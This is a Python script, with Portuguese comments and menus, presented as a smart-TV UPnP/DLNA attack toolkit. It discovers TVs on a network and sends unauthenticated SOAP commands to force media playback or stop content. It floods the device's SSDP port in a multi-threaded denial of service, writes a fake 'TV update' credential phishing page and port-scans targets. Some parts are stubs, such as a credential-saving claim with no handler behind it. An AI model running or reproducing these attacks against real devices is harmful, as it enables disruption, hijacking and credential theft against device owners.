#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
UPnP/DLNA Attack Toolkit - Ferramenta Real de Teste
"""

import socket
import requests
import threading
import time
import os
import xml.etree.ElementTree as ET
from urllib.parse import urlparse, urljoin
import subprocess
import netifaces
from http.server import HTTPServer, SimpleHTTPRequestHandler

class UPNPAttackTool:
    def __init__(self):
        self.target_ip = None
        self.upnp_port = 1900
        self.dlna_port = 8200
        self.local_ip = self.get_local_ip()
        self.media_files = []
        self.attacks_running = False

    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')

    def display_banner(self):
        banner = """
        ╔══════════════════════════════════════════════════════════════╗
        ║                                                              ║
        ║               🖥️  UPnP/DLNA ATTACK TOOLKIT 🎯               ║
        ║                                                              ║
        ║         Ferramenta Real de Teste UPnP/DLNA                  ║
        ║                                                              ║
        ╚══════════════════════════════════════════════════════════════╝
        
        ⚠️  AVISO: Use apenas em redes próprias ou com autorização!
        """
        print(banner)

    def get_local_ip(self):
        """Obtém o IP local da máquina"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def discover_upnp_devices(self):
        """Descobre dispositivos UPnP na rede"""
        print("\n[🔍] Procurando dispositivos UPnP/DLNA...")
        
        # Mensagem de descoberta UPnP
        discover_message = (
            'M-SEARCH * HTTP/1.1\r\n'
            'HOST: 239.255.255.250:1900\r\n'
            'MAN: "ssdp:discover"\r\n'
            'MX: 2\r\n'
            'ST: ssdp:all\r\n'
            '\r\n'
        )

        devices = []
        
        try:
            # Socket para broadcast
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock.settimeout(5)
            
            # Envia mensagem de descoberta
            sock.sendto(discover_message.encode(), ('239.255.255.250', 1900))
            
            # Coleta respostas
            start_time = time.time()
            while time.time() - start_time < 10:
                try:
                    data, addr = sock.recvfrom(1024)
                    response = data.decode('utf-8', errors='ignore')
                    
                    if '200 OK' in response or 'ST:' in response:
                        device_info = self.parse_upnp_response(response, addr[0])
                        if device_info and 'tv' in device_info.get('server', '').lower():
                            devices.append(device_info)
                            print(f"[✅] Smart TV encontrada: {addr[0]} - {device_info.get('server', 'Unknown')}")
                            
                except socket.timeout:
                    continue
                    
            sock.close()
            
        except Exception as e:
            print(f"[❌] Erro na descoberta: {e}")
            
        return devices

    def parse_upnp_response(self, response, ip):
        """Analisa resposta UPnP"""
        device_info = {'ip': ip}
        
        lines = response.split('\n')
        for line in lines:
            if line.startswith('SERVER:'):
                device_info['server'] = line.split(':', 1)[1].strip()
            elif line.startswith('LOCATION:'):
                device_info['location'] = line.split(':', 1)[1].strip()
            elif line.startswith('ST:'):
                device_info['service'] = line.split(':', 1)[1].strip()
                
        return device_info

    def media_injection_attack(self, target_ip, media_url):
        """Injeção de mídia maliciosa"""
        print(f"\n[🎬] Tentando injetar mídia em {target_ip}...")
        
        try:
            # Tenta enviar comando de reprodução via UPnP
            upnp_action = f"""
            <?xml version="1.0" encoding="utf-8"?>
            <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
                <s:Body>
                    <u:SetAVTransportURI xmlns:u="urn:schemas-upnp-org:service:AVTransport:1">
                        <InstanceID>0</InstanceID>
                        <CurrentURI>{media_url}</CurrentURI>
                        <CurrentURIMetaData></CurrentURIMetaData>
                    </u:SetAVTransportURI>
                </s:Body>
            </s:Envelope>
            """
            
            # Envia para várias portas comuns
            for port in [9197, 7676, 8060, 8008]:
                try:
                    response = requests.post(
                        f"http://{target_ip}:{port}/upnp/control/AVTransport1",
                        data=upnp_action,
                        headers={
                            'Content-Type': 'text/xml; charset="utf-8"',
                            'SOAPAction': '"urn:schemas-upnp-org:service:AVTransport:1#SetAVTransportURI"'
                        },
                        timeout=5
                    )
                    if response.status_code == 200:
                        print(f"[✅] Comando de reprodução enviado para porta {port}")
                        return True
                except:
                    continue
                    
        except Exception as e:
            print(f"[❌] Erro na injeção de mídia: {e}")
            
        return False

    def create_fake_media_server(self):
        """Cria servidor de mídia fake para DLNA"""
        print("\n[🎭] Iniciando servidor de mídia malicioso...")
        
        # Cria arquivo de mídia fake
        os.makedirs("media_server", exist_ok=True)
        
        # Cria vídeo malicioso (apenas exemplo)
        with open("media_server/malicious_video.m3u", "w") as f:
            f.write("#EXTM3U\n")
            f.write("#EXTINF:123,Sample\n")
            f.write("http://example.com/fake\n")
        
        # Inicia servidor HTTP em thread
        def run_server():
            os.chdir("media_server")
            handler = SimpleHTTPRequestHandler
            server = HTTPServer((self.local_ip, 8080), handler)
            server.serve_forever()
        
        server_thread = threading.Thread(target=run_server, daemon=True)
        server_thread.start()
        
        print(f"[🌐] Servidor rodando em http://{self.local_ip}:8080")
        return f"http://{self.local_ip}:8080/malicious_video.m3u"

    def content_hijacking_attack(self, target_ip):
        """Ataque de sequestro de conteúdo"""
        print(f"\n[🔄] Iniciando sequestro de conteúdo em {target_ip}...")
        
        try:
            # Tenta descobrir serviços UPnP
            services = ['AVTransport', 'RenderingControl', 'ContentDirectory']
            
            for service in services:
                control_url = f"http://{target_ip}:9197/upnp/control/{service}1"
                
                # Tenta enviar comando de parada
                stop_action = """
                <?xml version="1.0"?>
                <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
                    <s:Body>
                        <u:Stop xmlns:u="urn:schemas-upnp-org:service:AVTransport:1">
                            <InstanceID>0</InstanceID>
                        </u:Stop>
                    </s:Body>
                </s:Envelope>
                """
                
                try:
                    response = requests.post(
                        control_url,
                        data=stop_action,
                        headers={
                            'Content-Type': 'text/xml',
                            'SOAPAction': f'"urn:schemas-upnp-org:service:{service}:1#Stop"'
                        },
                        timeout=3
                    )
                    if response.status_code == 200:
                        print(f"[✅] Comando Stop enviado para {service}")
                except:
                    pass
                    
        except Exception as e:
            print(f"[❌] Erro no sequestro: {e}")

    def denial_of_service_attack(self, target_ip):
        """Ataque de Negação de Serviço"""
        print(f"\n[💥] Iniciando ataque DoS em {target_ip}...")
        
        def send_upnp_flood():
            count = 0
            while self.attacks_running and count < 1000:  # Limite de segurança
                try:
                    # Envia requisições UPnP malformadas
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.sendto(b"INVALID UPNP DATA", (target_ip, 1900))
                    sock.close()
                    count += 1
                    time.sleep(0.01)
                except:
                    pass
        
        # Inicia múltiplas threads
        for i in range(10):
            t = threading.Thread(target=send_upnp_flood)
            t.daemon = True
            t.start()
        
        print("[⚠️] Ataque DoS iniciado (10 threads)")
        return True

    def credential_harvesting_attack(self, target_ip):
        """Ataque de captura de credenciais"""
        print(f"\n[🎣] Configurando phishing para {target_ip}...")
        
        # Cria página de login fake
        login_page = """
        <html>
        <head><title>TV Update Required</title></head>
        <body>
            <h2>Smart TV Update Required</h2>
            <p>Please enter your credentials to continue</p>
            <form action="/login" method="post">
                Username: <input type="text" name="username"><br>
                Password: <input type="password" name="password"><br>
                <input type="submit" value="Update">
            </form>
        </body>
        </html>
        """
        
        # Salva página
        with open("phishing_page.html", "w") as f:
            f.write(login_page)
        
        print("[🌐] Página de phishing criada: phishing_page.html")
        print("[📧] Credenciais serão salvas em credentials.txt")
        
        return "http://localhost:8080/phishing_page.html"

    def upnp_tv_attacks(self):
        """Retorna lista de ataques UPnP"""
        return {
            "media_injection": "Forçar reprodução de vídeos maliciosos",
            "content_hijacking": "Substituir conteúdo legítimo por malicioso", 
            "denial_of_service": "Travar TV com flood UPnP",
            "credential_harvesting": "Fake login screens via TV",
            "device_recon": "Reconhecimento detalhado do dispositivo"
        }

    def run_attack(self, attack_type, target_ip):
        """Executa um ataque específico"""
        print(f"\n[🎯] Executando {attack_type} em {target_ip}...")
        
        if attack_type == "media_injection":
            media_url = self.create_fake_media_server()
            return self.media_injection_attack(target_ip, media_url)
            
        elif attack_type == "content_hijacking":
            return self.content_hijacking_attack(target_ip)
            
        elif attack_type == "denial_of_service":
            self.attacks_running = True
            result = self.denial_of_service_attack(target_ip)
            input("\n[⏹️] Pressione Enter para parar o ataque DoS...")
            self.attacks_running = False
            return result
            
        elif attack_type == "credential_harvesting":
            return self.credential_harvesting_attack(target_ip)
            
        elif attack_type == "device_recon":
            return self.detailed_reconnaissance(target_ip)

    def detailed_reconnaissance(self, target_ip):
        """Reconhecimento detalhado do dispositivo"""
        print(f"\n[📡] Reconhecimento detalhado de {target_ip}...")
        
        info = {
            'ip': target_ip,
            'upnp_services': [],
            'open_ports': [],
            'device_info': {}
        }
        
        # Scan de portas UPnP comuns
        ports = [1900, 9197, 7676, 8060, 8008, 8200, 9000]
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target_ip, port))
                if result == 0:
                    info['open_ports'].append(port)
                    print(f"[✅] Porta {port} aberta")
                sock.close()
            except:
                pass
        
        # Tenta obter descrição do dispositivo UPnP
        try:
            response = requests.get(f"http://{target_ip}:9197/description.xml", timeout=3)
            if response.status_code == 200:
                root = ET.fromstring(response.content)
                for child in root:
                    if child.text:
                        info['device_info'][child.tag] = child.text
                        print(f"[📝] {child.tag}: {child.text}")
        except:
            pass
            
        return info

    def main_menu(self):
        """Menu principal"""
        while True:
            self.clear_screen()
            self.display_banner()
            
            print("\n🎮 MENU PRINCIPAL")
            print("═" * 50)
            print("1. 🔍 Descobrir Smart TVs UPnP")
            print("2. 🎯 Ataques UPnP/DLNA")
            print("3. 📊 Informações do Dispositivo")
            print("4. 🚪 Sair")
            print("═" * 50)
            
            choice = input("\n🔹 Escolha uma opção (1-4): ").strip()
            
            if choice == '1':
                self.discover_menu()
            elif choice == '2':
                self.attacks_menu()
            elif choice == '3':
                self.info_menu()
            elif choice == '4':
                print("\n👋 Saindo...")
                break
            else:
                print("\n❌ Opção inválida!")
                time.sleep(2)

    def discover_menu(self):
        """Menu de descoberta"""
        self.clear_screen()
        print("\n[🔍] Procurando dispositivos UPnP...")
        
        devices = self.discover_upnp_devices()
        
        if not devices:
            print("[❌] Nenhuma Smart TV UPnP encontrada.")
        else:
            print(f"\n[✅] {len(devices)} dispositivo(s) encontrado(s):")
            for i, device in enumerate(devices, 1):
                print(f"  {i}. {device['ip']} - {device.get('server', 'Unknown')}")
        
        input("\n🔹 Pressione Enter para continuar...")

    def attacks_menu(self):
        """Menu de ataques"""
        self.clear_screen()
        print("\n🔫 MENU DE ATAQUES UPnP/DLNA")
        print("═" * 50)
        
        attacks = self.upnp_tv_attacks()
        for i, (attack, description) in enumerate(attacks.items(), 1):
            print(f"{i}. {attack.replace('_', ' ').title()}")
            print(f"   📝 {description}")
            print()
        
        target_ip = input("🔹 IP da Smart TV: ").strip()
        if not target_ip:
            print("❌ IP inválido!")
            return
        
        try:
            choice = input("🔹 Escolha o ataque (1-5): ").strip()
            attack_keys = list(attacks.keys())
            
            if choice.isdigit() and 1 <= int(choice) <= len(attack_keys):
                attack_type = attack_keys[int(choice) - 1]
                self.run_attack(attack_type, target_ip)
            else:
                print("❌ Escolha inválida!")
                
        except Exception as e:
            print(f"❌ Erro: {e}")
        
        input("\n🔹 Pressione Enter para continuar...")

    def info_menu(self):
        """Menu de informações"""
        self.clear_screen()
        target_ip = input("\n🔹 IP para reconhecimento: ").strip()
        
        if target_ip:
            info = self.detailed_reconnaissance(target_ip)
            print(f"\n📊 RELATÓRIO DE RECONHECIMENTO:")
            print(f"IP: {info['ip']}")
            print(f"Portas abertas: {info['open_ports']}")
            print(f"Serviços UPnP: {info['upnp_services']}")
            print(f"Informações: {info['device_info']}")
        
        input("\n🔹 Pressione Enter para continuar...")

def main():
    """Função principal"""
    try:
        tool = UPNPAttackTool()
        tool.main_menu()
    except KeyboardInterrupt:
        print("\n\n👋 Programa interrompido pelo usuário")
    except Exception as e:
        print(f"\n💥 Erro: {e}")

if __name__ == "__main__":
    main()
